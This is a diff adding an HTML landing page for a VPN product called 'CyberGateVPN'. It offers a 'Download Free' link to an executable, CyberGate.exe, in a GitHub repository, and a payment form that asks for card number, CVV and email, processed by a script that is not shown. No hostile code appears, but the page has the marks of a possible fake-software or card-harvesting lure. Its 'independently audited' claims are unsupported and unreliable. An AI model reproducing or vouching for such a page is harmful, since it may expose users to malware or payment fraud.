@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>CyberGateVPN — Secure Your Digital Freedom</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="bg"></div>
+  <div class="grid"></div>
+
+  <nav>
+    <div class="nav-container">
+      <div class="logo">CyberGateVPN</div>
+      <div class="nav-links">
+        <a href="#features" data-i18n="nav_features">Features</a>
+        <a href="#pricing" data-i18n="nav_pricing">Pricing</a>
+        <a href="#download-free" data-i18n="nav_download">Download</a>
+        <a href="#" style="color:#00f0ff;" data-i18n="nav_support">Support</a>
+        <div class="lang-switch">
+          <button class="lang-btn active" data-lang="ru">RU</button>
+          <button class="lang-btn" data-lang="ua">UA</button>
+          <button class="lang-btn" data-lang="eu">EU</button>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <section class="hero">
+    <div class="hero-content">
+      <h1>CyberGateVPN</h1>
+      <p class="hero-subtitle" data-i18n="hero_subtitle">Secure Your Digital Freedom</p>
+      <p class="hero-desc" data-i18n="hero_desc">Military-grade encryption - No-logs policy - Blazing fast speeds</p>
+      <div class="hero-buttons">
+        <button class="btn btn-primary" onclick="scrollToPricing()" data-i18n="hero_btn_protected">Get Protected Now</button>
+        <button class="btn btn-outline" onclick="scrollToDownload()" data-i18n="hero_btn_download">Free Download</button>
+      </div>
+    </div>
+  </section>
+
+  <section class="map-section">
+    <h2 class="section-title" data-i18n="map_title">Global Encrypted Network</h2>
+    <div class="map">
+      <div class="map-text" data-i18n="map_live">LIVE ENCRYPTED CONNECTIONS</div>
+    </div>
+  </section>
+
+  <section id="features">
+    <h2 class="section-title" data-i18n="features_title">Why CyberGateVPN?</h2>
+    <div class="features-grid">
+      <div class="feature-card">
+        <h3 data-i18n="feature1_title">No Logs Policy</h3>
+        <p data-i18n="feature1_desc">Audited and independently verified. Your data stays yours.</p>
+      </div>
+      <div class="feature-card">
+        <h3 data-i18n="feature2_title">Ultra Fast</h3>
+        <p data-i18n="feature2_desc">10 Gbps servers - WireGuard protocol included.</p>
+      </div>
+      <div class="feature-card">
+        <h3 data-i18n="feature3_title">Military Encryption</h3>
+        <p data-i18n="feature3_desc">AES-256 + ChaCha20 for maximum security.</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="pricing">
+    <h2 class="section-title" data-i18n="pricing_title">Choose Your Plan</h2>
+    <div class="pricing-container">
+      <div class="plan-card" id="plan-free">
+        <h3 data-i18n="plan_free_name">Free</h3>
+        <p class="plan-duration free-duration" data-i18n="plan_free_duration">1 Month</p>
+        <div class="region-badge" id="free-region-count">30+ regions</div>
+        <p class="plan-desc" data-i18n="plan_free_desc">Basic protection</p>
+        <button class="btn btn-outline btn-full" onclick="showPayment('free')" data-i18n="plan_free_btn">Start Free</button>
+      </div>
+      <div class="plan-card plan-premium" id="plan-premium">
+        <h3 data-i18n="plan_premium_name">Premium</h3>
+        <p class="plan-duration premium-duration" data-i18n="plan_premium_duration">3 Years</p>
+        <div class="region-badge" id="premium-region-count">75+ regions</div>
+        <p class="plan-desc" data-i18n="plan_premium_desc">All features unlocked</p>
+        <button class="btn btn-primary btn-full" onclick="showPayment('premium')" data-i18n="plan_premium_btn">Get Premium</button>
+      </div>
+      <div class="plan-card" id="plan-lifetime">
+        <h3 data-i18n="plan_lifetime_name">Lifetime</h3>
+        <p class="plan-duration lifetime-duration" data-i18n="plan_lifetime_duration">Forever</p>
+        <div class="region-badge" id="lifetime-region-count">110+ regions</div>
+        <p class="plan-desc" data-i18n="plan_lifetime_desc">One-time payment</p>
+        <button class="btn btn-outline btn-lifetime" onclick="showPayment('lifetime')" data-i18n="plan_lifetime_btn">Buy Lifetime</button>
+      </div>
+    </div>
+
+    <div id="download-free" class="download-section">
+      <h3 class="download-title" data-i18n="download_title">Download Free Version</h3>
+      <p class="download-subtitle" data-i18n="download_subtitle">Choose a region for connection (demo access)</p>
+      
+      <div class="region-selector" id="regionSelector">
+        <span class="region-chip active" data-region="Germany">Germany</span>
+        <span class="region-chip" data-region="Netherlands">Netherlands</span>
+        <span class="region-chip" data-region="Japan">Japan</span>
+        <span class="region-chip" data-region="Singapore">Singapore</span>
+        <span class="region-chip" data-region="Canada">Canada</span>
+        <span class="region-chip" data-region="Switzerland">Switzerland</span>
+      </div>
+      
+      <div id="region-description" class="region-description">
+        Free access: 30+ virtual locations
+      </div>
+      
+      <a href="https://github.com/CyberGateVpn/CyberGateVPN.github.io/blob/main/CyberGate.exe" 
+         class="btn btn-primary download-btn" 
+         id="downloadFreeBtn"
+         download>
+        <i class="fas fa-download"></i> <span data-i18n="download_btn">Download Free</span>
+      </a>
+      <p class="regions-info"><span data-i18n="download_regions_available">Available regions</span>: <span id="activeRegionCount">30+</span> - <span data-i18n="download_no_reg">No registration</span></p>
+    </div>
+  </section>
+
+  <div id="paymentModal" class="modal">
+    <div class="modal-content">
+      <h2 id="modalPlan" class="modal-title">Payment</h2>
+      <input type="text" placeholder="Card Number" data-i18n-placeholder="card_number">
+      <input type="text" placeholder="Cardholder Name" data-i18n-placeholder="card_name">
+      <div class="modal-row">
+        <input type="text" placeholder="MM/YY" data-i18n-placeholder="card_expiry">
+        <input type="text" placeholder="CVV" data-i18n-placeholder="card_cvv">
+      </div>
+      <input type="email" placeholder="Email" data-i18n-placeholder="email">
+      <button onclick="completePayment()" class="btn-payment" data-i18n="payment_btn">Complete Secure Payment</button>
+      <button onclick="closeModal()" class="btn-cancel" data-i18n="payment_cancel">Cancel</button>
+    </div>
+  </div>
+
+  <footer>
+    <span data-i18n="footer_text">2025 CyberGateVPN. All rights reserved. Digital freedom.</span>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+</html>
